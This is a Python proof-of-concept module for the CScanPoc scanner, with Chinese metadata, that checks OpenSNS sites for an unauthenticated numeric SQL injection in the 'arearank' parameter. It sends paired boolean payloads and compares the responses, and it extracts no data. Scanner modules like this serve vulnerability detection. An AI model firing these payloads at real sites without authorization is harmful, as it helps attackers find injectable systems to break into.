# coding:utf-8
from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'OpenSNS_0001'  # 平台漏洞编号
    name = 'OpenSNS前台无限制注入(无需登录无视GPC)'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2016-07-23'  # 漏洞公布时间
    desc = '''
        OpenSNS开源社交建站系统,是基于OneThink的轻量级社交化用户中心框架,
        漏洞触发点在/Application/People/Controller/IndexController.class.php中第48行：
        $arearank有这样一个赋值操作：$arearank = I('get.arearank', 0);
        直接将$arearank与upid=做拼接然后组装到了where语句中，周围并无引号进行包裹，是一个数字型的注入。
    '''  # 漏洞描述
    ref = 'http://0day5.com/archives/3973/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'OpenSNS'  # 漏洞组件名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'b44df684-9688-4cfc-b11d-275d2afe69aa'  # 平台 POC 编号
    author = '47bwy'  # POC编写者
    create_date = '2018-06-26'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payload_normal = "/index.php?s=/people/index/area.html&arearank=-1) or (1=1"
            payload_abnormal = "/index.php?s=/people/index/area.html&arearank=-1) or (1=2"
            url_normal = self.target + payload_normal
            url_abnormal = self.target + payload_abnormal
            r_normal = requests.get(url_normal)
            r_abnormal = requests.get(url_abnormal)

            if r_normal.text != r_abnormal.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
